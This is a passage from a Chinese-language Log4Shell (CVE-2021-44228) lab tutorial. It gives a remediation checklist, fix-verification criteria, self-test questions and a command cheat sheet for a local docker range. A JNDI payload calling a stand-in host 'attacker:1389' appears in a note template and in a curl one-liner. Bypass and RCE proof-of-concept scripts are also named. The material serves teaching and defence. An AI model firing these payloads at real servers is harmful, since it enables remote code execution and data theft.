顺带一提，L3 的 `×9` 还说明：混淆 payload 会放大请求量，
规则设计上应该关注「短时间重复外连」这类行为特征，而不只是单个字符串。

### 9.5 排查清单

- 依赖树 + 实际 jar 字节码，两处都查（见 9.1）
- 应用日志里搜 `${jndi:`、`${${::`、`JndiLookup` 相关异常堆栈
  —— 第 7 节 ① 的 `ClassCastException` 就是很好的入侵痕迹
- 出站连接记录：LDAP 389/1389、RMI 1099、异常 DNS 查询
- 注意页面无回显、HTTP 200 也可能已经中招（L1 实测）

### 9.6 怎么验收"真的修好了"

别只查版本号，要打一次看观测点。用本靶场三个端口就能把验收标准定下来：

- **通过**：像 `19082` 一样，`/events` 里 `ldap_*` 为 0、`codebase` 为 0、`collect` 为 0
- **不通过，但拦住了一半**：像 `19081` 一样有 `ldap_search` 却没有 `codebase`
  —— 这是 JDK 加固的效果，不是组件修好了
- **完全没修**：像 `19080` 一样 `collect` 里出现 flag

同时确认应用日志无异常、出站连接无新增。

**参考**：Apache Log4j 安全页
`https://logging.apache.org/log4j/2.x/security.html`；
CISA 的 CVE-2021-44228 指南与各厂商公告。

---

## 10. 练完怎么记

按这个模板记一条，比抄十页概念有用：

```
Log4Shell（CVE-2021-44228，组件漏洞）
  漏洞点：log4j-core 2.14.1，日志消息里的 ${jndi:} 被当表达式执行
  载荷：  User-Agent: ${jndi:ldap://attacker:1389/l2}
  四跳：  LOG.info → JndiLookup → LDAP Reference → HTTP codebase → static{} 执行
  三种危害：env 外带（不需 RCE）/ 远程类加载 RCE / 递归替换放大 9 倍
  两种"加固"：新 JDK 只挡远程 codebase（仍有回连）；2.17.1 连回连都没有
  一句话：过滤发生在解析之前，攻击串在解析过程中才成形，所以 WAF 挡不住
```

**自测（能答出来才算过）**

1. 业务代码只有 `LOG.info(...)`，为什么能 RCE？把四跳分别说清是谁做的。
2. 为什么 payload 放 URL 参数不触发，放 `User-Agent` 就能触发？
3. `${env:FLAG_L1}` 为什么能把数据带出来？这一跳需要加载 class 吗？
4. `javaNamingReference` 里哪两个属性决定"去哪下载、下载哪个类"？
5. 为什么 `L2.class` 必须用 JDK 8 编译？不实现 `ObjectFactory` 会留下什么？
6. 新 JDK 阻止了什么、没阻止什么？举出两种仍然成立的利用。
7. WAF 删 `jndi` / `ldap` 为什么不够？换成你会检测什么特征？
8. 为什么升到 2.15.0 / 2.16.0 不算修完？Java 7 该升到哪个版本？
9. 怎么验收"真的修好了"？说出观测点，别只说"看版本号"。

---

## 附：命令速查

```bash
# 启动 / 重置 / 停止
./log4shell/up.sh
./log4shell/setup.sh
docker compose -f log4shell/compose.yml down

# 四关 + 一键回归
python3 log4shell/poc/01_probe.py        # L1 env 外带
python3 log4shell/poc/02_rce.py          # L2 远程 codebase RCE
python3 log4shell/poc/03_bypass.py       # L3 ${::-j} 绕过黑名单
python3 log4shell/poc/04_hardened.py     # L4 加固对照
python3 log4shell/poc/verify.py

# 判题器
curl -s http://127.0.0.1:19089/reset
curl -s http://127.0.0.1:19089/events | grep -E '"kind"|"base"|"body"'

# 手工打一发（L2）
curl -s --max-time 15 -A '${jndi:ldap://attacker:1389/l2}' \
     http://127.0.0.1:19080/ >/dev/null

# 目标侧日志（看触发点和异常堆栈）
docker logs log4shell-app
docker logs --since 2m log4shell-app | grep -Ec 'Exception|ERROR'
```
